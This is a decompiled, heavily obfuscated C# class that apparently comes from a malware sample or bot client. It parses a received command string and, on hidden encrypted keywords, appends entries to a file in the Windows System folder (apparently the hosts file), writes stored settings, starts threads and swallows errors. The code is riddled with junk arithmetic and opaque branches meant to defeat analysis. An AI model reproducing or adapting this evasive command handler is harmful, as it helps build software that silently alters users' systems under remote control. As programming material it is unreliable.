using System;
using System.IO;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal class ________________________________________________
{
	public string _;

	public unsafe ________________________________________________()
	{
		int __________ = _003CModule_003E.___________;
		this._ = _003CModule_003E.__________((int)((__________ * 85 + __________ * 43 != 974290426) ? ((nint)Type.EmptyTypes.LongLength + 58355) : ((nint)Type.EmptyTypes.LongLength + 1802838265)), sizeof(ushort) + 58208, (int)((nint)Type.EmptyTypes.LongLength + 184));
	}

	public void _()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					break;
				case 51:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 3:
							goto end_IL_0000_3;
						}
						goto default;
					}
					end_IL_0000_2:
					break;
				}
				num = 2;
				__(this._);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 51;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public unsafe void __(string string_0)
	{
		try
		{
			int num = default(int);
			int num2 = default(int);
			int num6 = default(int);
			if (string_0.Contains(_003CModule_003E.___<string>(1656148619u)))
			{
				try
				{
					if ((uint)num / 33554432u == 4294958369u)
					{
					}
					string[] array = Strings.Split(string_0, _003CModule_003E.______<string>(1888012997u), -1, (CompareMethod)0);
					num2 = sizeof(uint) + -26145;
					int num3 = default(int);
					nint num4 = ((num3 * 595984384 != 620283332) ? ((nint)Type.EmptyTypes.LongLength + 0) : (sizeof(int) + 1582160349));
					string[] array4 = default(string[]);
					string[] array3 = default(string[]);
					int num5 = default(int);
					string[] array2 = default(string[]);
					string text = default(string);
					while (true)
					{
						switch (num4)
						{
						case 2:
							array4 = array3;
							num5 = 0;
							goto IL_007a;
						default:
						{
							string text2 = array[1];
							if (text2.Contains(_003CModule_003E.___<string>(2745042844u)))
							{
								if (num2 == -26141)
								{
									array3 = Strings.Split(text2, _003CModule_003E.______<string>(4195373496u), -1, (CompareMethod)0);
									num4 = (nint)Type.EmptyTypes.LongLength + 2;
									continue;
								}
								goto IL_00c2;
							}
							break;
						}
						case 1:
							{
								do
								{
									array2 = Strings.Split(text, _003CModule_003E._______<string>(1023697363u), -1, (CompareMethod)0);
								}
								while (num2 != -933);
								goto IL_00c2;
							}
							IL_007a:
							if (num5 < array4.Length)
							{
								text = array4[num5];
								num6 = -933;
								num2 = num6;
								if (((num * 22 + 42 * num << 10) | -33674) != -33674)
								{
									goto default;
								}
								num4 = (nint)Type.EmptyTypes.LongLength + 1;
								continue;
							}
							break;
							IL_00c2:
							if (array2.Length == 4)
							{
								if (array2[2].Contains(_003CModule_003E.___<string>(2684433240u)))
								{
									______________________.________(array2[0]);
								}
								else
								{
									______________________._________(array2[1], array2[0]);
								}
							}
							num5++;
							goto IL_007a;
						}
						break;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (string_0.Contains(_003CModule_003E.___<string>(2361874901u)))
			{
				try
				{
					string[] array5 = Strings.Split(string_0, _003CModule_003E.___<string>(2361874901u), -1, (CompareMethod)0);
					string string_ = array5[1];
					__________________________________________________________________._____(_003CModule_003E.___<string>(677277871u), string_);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			int num8 = default(int);
			int num9 = default(int);
			if (string_0.Contains(_003CModule_003E._______<string>(1499958910u)))
			{
				try
				{
					int __________ = _003CModule_003E.___________;
					if ((0x10u & (uint)(((__________ - 4313) * 16) ^ ((__________ << 4) - 2308))) != 0)
					{
						goto IL_0305;
					}
					string[] array6 = Strings.Split(string_0, _003CModule_003E.____<string>(3781589868u), -1, (CompareMethod)0);
					int num7 = 1308;
					if (sizeof(long) + 15914 != 23553)
					{
					}
					string text3 = array6[1];
					string path = default(string);
					if (___________________________________________________________________.________())
					{
						path = Environment.GetFolderPath(Environment.SpecialFolder.System) + _003CModule_003E.____<string>(412407394u);
						num8 = num7;
						num7 = -29220;
						if (num8 == 678)
						{
							int _______________ = _003CModule_003E.________________;
							if (_______________ * 2097152 - 1898393065 - 71303168 != _______________ - 5966 << 21)
							{
								goto IL_02ab;
							}
						}
						goto IL_03ba;
					}
					goto end_IL_01e7;
					IL_03b1:
					string[] array7 = default(string[]);
					string text5 = default(string);
					if (array7.Length == 2)
					{
						string text4 = array7[0] + _003CModule_003E.______<string>(851744222u) + array7[1];
						if (!text5.Contains(text4))
						{
							File.AppendAllText(path, _003CModule_003E.____<string>(1749054564u) + text4);
						}
					}
					num9++;
					goto IL_0331;
					IL_03ba:
					if (text3.Contains(_003CModule_003E.______<string>(2527520401u)))
					{
						text5 = File.ReadAllText(path);
						if (num7 == -29220)
						{
							goto IL_0305;
						}
						goto IL_03b1;
					}
					goto end_IL_01e7;
					IL_0331:
					string[] array8 = default(string[]);
					string text6 = default(string);
					if (num9 < array8.Length)
					{
						text6 = array8[num9];
						num7 = -27003;
						if (((num2 - 2749) & num2 & 1) == 0 || (uint)num2 % 68056u != 2094716642)
						{
							goto IL_02ab;
						}
						goto IL_03b1;
					}
					goto end_IL_01e7;
					IL_0305:
					string[] array9 = Strings.Split(text3, _003CModule_003E._______<string>(1390413814u), -1, (CompareMethod)0);
					switch (sizeof(long))
					{
					}
					array8 = array9;
					num9 = 0;
					goto IL_0331;
					IL_02ab:
					array7 = Strings.Split(text6, _003CModule_003E._____<string>(2815274875u), -1, (CompareMethod)0);
					if ((-211 | (num8 * 1334016 - -1459081638)) != -81 || num7 != -15701)
					{
						goto IL_03b1;
					}
					goto IL_03ba;
					end_IL_01e7:;
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			if (string_0.Contains(_003CModule_003E._____<string>(3053342697u)))
			{
				try
				{
					string[] array10 = Strings.Split(string_0, _003CModule_003E.______<string>(192526068u), -1, (CompareMethod)0);
					string string_2 = array10[1];
					__________________________________________________________________._____(_003CModule_003E.____<string>(785636889u), string_2);
					________________________._();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			int num13 = default(int);
			int num14 = default(int);
			int num15 = default(int);
			if (string_0.Contains(_003CModule_003E.___<string>(2604313317u)))
			{
				try
				{
					if (((-1610612736 * num8 - 1283369504) | -12) != -12)
					{
						goto IL_0498;
					}
					goto IL_0932;
					IL_0932:
					string[] array11 = Strings.Split(string_0, _003CModule_003E.______<string>(1512991627u), -1, (CompareMethod)0);
					int num10 = 27239;
					string text7 = default(string);
					nint num11;
					if ((nint)Type.EmptyTypes.LongLength + -7728 != -1942)
					{
						text7 = array11[1];
						if (!text7.Contains(_003CModule_003E._______<string>(4070930389u)))
						{
							goto IL_074b;
						}
						num11 = 5;
						goto IL_0871;
					}
					goto IL_0901;
					IL_055d:
					nint num12 = (nint)Type.EmptyTypes.LongLength + 48294;
					int _______________2 = default(int);
					IntPtr intPtr;
					if ((((uint)num13 / 570u) ^ 0x2001DF0u) != 0)
					{
						_______________2 = _003CModule_003E.________________;
						intPtr = (((88 * _______________2 + _______________2 * 40) * (0x1872 & _______________2) * -268435456 < 0) ? (sizeof(double) + -1943117805) : (((0x76Cu & (uint)(8847 + 66720 * _______________2)) != 0) ? 48100 : (((0x400936u ^ ((uint)(num14 & 0x1F3C) / 2097152u)) != 0) ? 1824931867 : ((nint)Type.EmptyTypes.LongLength + 1835216655))));
					}
					else
					{
						num = _003CModule_003E._____________;
						intPtr = ((((57 + ((uint)num >> 27)) | 0xFFFFE9FFu) == 4294961663u) ? ((nint)Type.EmptyTypes.LongLength + 1214771454) : ((((uint)num9 & ((uint)(num15 << 17) % 8177u)) != 2893348248u) ? ((nint)Type.EmptyTypes.LongLength + -1792871218) : ((nint)Type.EmptyTypes.LongLength + 1248968271)));
					}
					nint num16;
					if (((uint)((_______________2 << 14) + 5260) >> 2) - 311438848 == (uint)(1342177280 * _______________2))
					{
						num16 = (nint)Type.EmptyTypes.LongLength + -1736318838;
					}
					else if ((uint)(2048 * num9) % 15588859u != 1575691667)
					{
						int num3 = _003CModule_003E.___________;
						num16 = (((0xAE0D3FFFu | ((uint)num3 / 720235u)) != 2920103935u) ? 1841078238 : ((-(num14 << 6) + (int)((uint)num14 / 134217728u) - 283936 == 4 * (0x21E1 & num14)) ? ((nint)Type.EmptyTypes.LongLength + 1435034292) : (((uint)num13 % 32u != 1600607413) ? 183 : (((1 & (num13 | (num13 - 4217))) != 1) ? (sizeof(double) + 1612844619) : 1512830386))));
					}
					else
					{
						num16 = 2007991074;
					}
					string text8 = _003CModule_003E.__________((int)num12, (int)(nint)intPtr, (int)num16);
					num10 = (int)((nint)Type.EmptyTypes.LongLength + 4595);
					num11 = (nint)Type.EmptyTypes.LongLength + 0;
					goto IL_0871;
					IL_0866:
					string[] array12 = default(string[]);
					string[] array13 = array12;
					num15 = 0;
					goto IL_0510;
					IL_0901:
					string[] array14 = default(string[]);
					string[] array15 = default(string[]);
					if (num14 < array14.Length)
					{
						string text9 = array14[num14];
						array15 = Strings.Split(text9, _003CModule_003E.___<string>(3242391558u), -1, (CompareMethod)0);
						num10 = 28650;
						if ((nint)Type.EmptyTypes.LongLength + 1899 == 1899)
						{
							goto IL_0498;
						}
						goto IL_0866;
					}
					goto IL_0962;
					IL_0510:
					if (num15 >= array13.Length)
					{
						num10 = -28589;
						if ((((int)(4 * ((uint)num8 / 32u << 4)) - -29408 == num8 * 32 << 6) ? ((nint)Type.EmptyTypes.LongLength + -1408926027) : ((nint)Type.EmptyTypes.LongLength + -17502)) != -17502)
						{
							goto IL_055d;
						}
						goto IL_079b;
					}
					string text10 = array13[num15];
					num11 = (nint)Type.EmptyTypes.LongLength + 1;
					goto IL_0871;
					IL_0498:
					string text11 = default(string);
					if (array15.Length == 4)
					{
						text11 = _003CModule_003E._______<string>(1974200954u) + array15[2] + _003CModule_003E._____<string>(1052623516u);
						num10 = (int)((nint)Type.EmptyTypes.LongLength + 10759);
						num11 = (nint)Type.EmptyTypes.LongLength + 8;
						goto IL_0871;
					}
					goto IL_08fb;
					IL_0962:
					if (text7.Contains(_003CModule_003E.___<string>(1071641545u)))
					{
						string[] array16 = Strings.Split(text7, _003CModule_003E.____<string>(3493284426u), -1, (CompareMethod)0);
						__________________________________________________________________._____(_003CModule_003E._____<string>(2115722719u), array16[1]);
					}
					goto end_IL_0443;
					IL_0871:
					string[] array17 = default(string[]);
					while (true)
					{
						switch (num11)
						{
						case 6:
							if (array17.Length == 3)
							{
								text8 = text8 + _003CModule_003E.____<string>(966602549u) + text10 + _003CModule_003E.___<string>(3992098268u);
								num11 = 3;
								continue;
							}
							break;
						case 3:
							break;
						default:
							goto IL_055d;
						case 4:
							goto IL_07cf;
						case 1:
							array17 = Strings.Split(text10, _003CModule_003E.______<string>(1514956238u), -1, (CompareMethod)0);
							num11 = 6;
							continue;
						case 0:
							goto IL_0820;
						case 8:
							goto IL_089f;
						case 2:
							goto IL_08fb;
						case 7:
							goto IL_0901;
						}
						break;
					}
					num15++;
					goto IL_0510;
					IL_089f:
					string text12 = default(string);
					if (text12.Contains(text11))
					{
						goto IL_08fb;
					}
					__________________________________________________________________.______(_003CModule_003E.___<string>(3249429995u), text11);
					int _______________3 = _003CModule_003E.________________;
					if (~((uint)((-2080374784 * _______________3) | (_______________3 * -776704)) >> 9) != (uint)(_______________3 - -6672) && num10 == 10759)
					{
						goto IL_08ee;
					}
					goto IL_0932;
					IL_07cf:
					text12 = _003CModule_003E.____<string>(2567499604u);
					goto IL_07db;
					IL_079b:
					__________________________________________________________________._____(_003CModule_003E._____<string>(3468640874u), text8);
					goto IL_074b;
					IL_08ee:
					____________________._______(array15[0], array15[1]);
					goto IL_08fb;
					IL_07db:
					string[] array18 = default(string[]);
					array14 = array18;
					num14 = 0;
					num11 = (nint)Type.EmptyTypes.LongLength + 7;
					goto IL_0871;
					IL_074b:
					if (text7.Contains(_003CModule_003E._____<string>(1309146939u)))
					{
						num10 = 26095;
						if ((nint)Type.EmptyTypes.LongLength + -28589 != 19709)
						{
							array18 = Strings.Split(text7, _003CModule_003E.____<string>(1801084627u), -1, (CompareMethod)0);
							if (num10 == 29170)
							{
								goto IL_079b;
							}
						}
						text12 = __________________________________________________________________.____(_003CModule_003E.______<string>(1193237925u));
						if (Operators.CompareString(text12, string.Empty, false) == 0)
						{
							goto IL_07cf;
						}
						goto IL_07db;
					}
					goto IL_0962;
					IL_08fb:
					num14++;
					goto IL_0901;
					IL_0820:
					array12 = Strings.Split(text7, _003CModule_003E.____<string>(966602549u), -1, (CompareMethod)0);
					if (num10 == 25446)
					{
						int ________________ = _003CModule_003E._________________;
						if (((uint)(________________ * 124 + ________________ * 4 - 7669) >> 7) - 113925046 != (uint)________________)
						{
							goto IL_08ee;
						}
					}
					goto IL_0866;
					end_IL_0443:;
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					______________________________________________________________.______________(_003CModule_003E.___<string>(1387161447u), _003CModule_003E._______<string>(713772963u) + ex2.ToString());
					ProjectData.ClearProjectError();
				}
			}
			if (string_0.Contains(_003CModule_003E._______<string>(4003464120u)))
			{
				try
				{
					string[] array19 = Strings.Split(string_0, _003CModule_003E.______<string>(3486781507u), -1, (CompareMethod)0);
					string string_3 = array19[1];
					__________________________________________________________________._____(_003CModule_003E.____<string>(586994363u), string_3);
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			string[] array20 = default(string[]);
			if (-2085124245 + num * -402653184 != 4792)
			{
				if (!string_0.Contains(_003CModule_003E.____<string>(2119824317u)))
				{
					goto IL_0b69;
				}
				array20 = Strings.Split(string_0, _003CModule_003E.______<string>(2152499031u), -1, (CompareMethod)0);
				int _________ = _003CModule_003E.__________;
				if ((int)((uint)_________ / 2597735u) < 0)
				{
					int num17 = _003CModule_003E.____________;
					nint num20;
					if (((uint)(-(1084 * num17 + num17 * 964)) >> 11) + 643 != (uint)num17)
					{
						int num18 = default(int);
						int num19;
						if ((((-1216984678 & num18) - 3177) & -9721) == 0)
						{
							num19 = sizeof(int) + 1489910916;
							num20 = num19;
						}
						else
						{
							int num21 = -1243314753;
							num19 = num21;
							num20 = num19;
						}
					}
					else if (num * 64 != -1308)
					{
						num20 = ((num15 * 116015104 != 1225106395) ? (sizeof(short) + 2045008629) : ((nint)Type.EmptyTypes.LongLength + 1939488332));
					}
					else
					{
						int num22 = ___________._;
						num20 = ((((num22 - -num22) | -2) != -2) ? ((nint)Type.EmptyTypes.LongLength + -1853253035) : ((nint)Type.EmptyTypes.LongLength + 1776734894));
					}
					switch (num20)
					{
					}
				}
			}
			if (!___________________________________________________________________.______())
			{
				string string_4 = _003CModule_003E.____<string>(1816301751u) + _____________________________________________________________________.___(array20[1]);
				__________________________________________________________________________.___ = null;
				______________________________________________________________.___________(string_4);
			}
			goto IL_0b69;
			IL_0b69:
			if (string_0.Contains(_003CModule_003E._____<string>(3990962675u)))
			{
				Thread thread = new Thread(____________________._);
				thread.Start();
			}
			if (!string_0.Contains(_003CModule_003E._____<string>(971381148u)))
			{
				return;
			}
			try
			{
				int num23 = default(int);
				if (num23 + -1627241277 == num23 + 1215 - 5123)
				{
					goto IL_0ca8;
				}
				string[] array21;
				int num24 = default(int);
				do
				{
					array21 = Strings.Split(string_0, _003CModule_003E.____<string>(3204978984u), -1, (CompareMethod)0);
					num24 = -12187;
				}
				while ((nint)Type.EmptyTypes.LongLength + 2417 == -13885);
				string text13 = array21[1];
				string[] array22 = default(string[]);
				nint num25;
				if (text13.Contains(_003CModule_003E.______<string>(137258400u)))
				{
					if (num24 != -7619)
					{
						array22 = Strings.Split(text13, _003CModule_003E.___<string>(164576132u), -1, (CompareMethod)0);
						num24 = (int)((nint)Type.EmptyTypes.LongLength + 26625);
						num25 = sizeof(float) + -4;
						goto IL_0ce7;
					}
					goto IL_0d6c;
				}
				goto IL_0d75;
				IL_0ca8:
				string text14 = default(string);
				if (Operators.CompareString(text14, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 1660), (int)((nint)Type.EmptyTypes.LongLength + 3471), sizeof(ulong) + 171), false) != 0)
				{
					num25 = (nint)Type.EmptyTypes.LongLength + 2;
					goto IL_0ce7;
				}
				goto IL_0d64;
				IL_0ce7:
				switch (num25)
				{
				case 1:
					break;
				default:
					goto IL_0d05;
				case 2:
					goto IL_0d6c;
				}
				goto IL_0ca8;
				IL_0d75:
				if (text13.Contains(_003CModule_003E.____<string>(1368626464u)))
				{
					string[] array23 = Strings.Split(text13, _003CModule_003E._______<string>(2212002034u), -1, (CompareMethod)0);
					__________________________________________________________________._____(_003CModule_003E.______<string>(2458435816u), array23[1]);
					____________________________________________________________.___ = array23[1];
				}
				return;
				IL_0d05:
				string[] array24;
				do
				{
					__________________________________________________________________._____(_003CModule_003E._____<string>(1665368331u), array22[1]);
					array24 = Strings.Split(array22[1], _003CModule_003E.______<string>(1514956238u), -1, (CompareMethod)0);
				}
				while ((0x165 & (num14 * 445 + 67 * num14 - 5181)) == 321 && num24 == 26733);
				string[] array25 = array24;
				num13 = 0;
				goto IL_0d57;
				IL_0d6c:
				____________________________________________________________.________(text14);
				goto IL_0d64;
				IL_0d64:
				num13++;
				goto IL_0d57;
				IL_0d57:
				if (num13 < array25.Length)
				{
					text14 = array25[num13];
					num25 = ((num6 * 805306368 == 718454987) ? ((nint)Type.EmptyTypes.LongLength + -1637524728) : ((512 * (0x4D4 ^ num23) + -782237696 != num23 * -4193792) ? ((nint)Type.EmptyTypes.LongLength + 1) : ((nint)Type.EmptyTypes.LongLength + 1508417638)));
					goto IL_0ce7;
				}
				goto IL_0d75;
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Exception ex4 = ex3;
			______________________________________________________________.______________(_003CModule_003E._____<string>(2571642080u), _003CModule_003E.____<string>(298688921u) + ex4.ToString());
			ProjectData.ClearProjectError();
		}
	}
}
